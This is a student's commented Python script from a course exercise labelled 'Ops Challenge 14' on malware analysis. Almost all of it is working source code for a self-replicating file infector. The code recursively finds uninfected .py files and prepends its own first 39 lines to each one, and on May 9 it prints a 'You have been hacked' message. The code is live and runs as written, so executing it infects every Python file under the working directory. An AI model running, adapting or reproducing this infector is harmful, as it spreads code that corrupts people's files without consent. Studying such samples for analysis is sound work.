#!/usr/bin/env python3

#Script: Ops Challenge 14
#Author: Ray Caoagdan
#Date of Last Revision: 05/2/2021
#Purpose: Pythoin Malware Analysis- Analzye Code

#!/usr/bin/python

import os #import operating system
import datetime # module used for manipulating date and time


SIGNATURE = "VIRUS" # Variable Signature assigned to string "VIRUS"

# Function to locate a file path 
def locate(path):
    files_targeted = [] # files_targeted list
    filelist = os.listdir(path) # variable calling os.listdir which  looks at names in directory where "path" is directory to be explored
    for fname in filelist: # for look that looks at every file name in the file list 
        if os.path.isdir(path+"/"+fname):# if statment to see if a filename exsisth in the targeted path
            files_targeted.extend(locate(path+"/"+fname)) # extend method | extends list files_targeted
        elif fname[-3:] == ".py": # if file contains a ".py"
            infected = False #set infected to false
            for line in open(path+"/"+fname):#for loop- opens file name in targeted path
                if SIGNATURE in line: #if variable exists in line perform following
                    infected = True # set infected to True
                    break # needed to brea kout of loop
            if infected == False: # if infntected is FALSE then perform the following 
                files_targeted.append(path+"/"+fname) #appends targeted file
    return files_targeted #sends results back

def infect(files_targeted):
    virus = open(os.path.abspath(__file__)) # takes absolute path | variable set to the most absolute pathname to file
    virusstring = "" #sets a blank variable 
    for i,line in enumerate(virus): # for loop | Scans file path for every instances that i appears in a line
        if 0 <= i < 39: # Seraches lines inside targeted file
            virusstring += line # Adds line value  to varible virusstring
    virus.close # closes file
    for fname in files_targeted: # For loop | for every fname in file_targeted perform the follwoing
        f = open(fname) # sets varaible f to open file
        temp = f.read() # sets varaible temp to read file
        f.close() #closes file
        f = open(fname,"w") # sets variable f to open fname file and make it writable
        f.write(virusstring + temp) # writes file 
        f.close() #closes file

def detonate():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9: #if current date (month and date) is EQUAL to 5/9 print following message
        print "You have been hacked"


# Calls functions above 
files_targeted = locate(os.path.abspath(""))
infect(files_targeted)
detonate()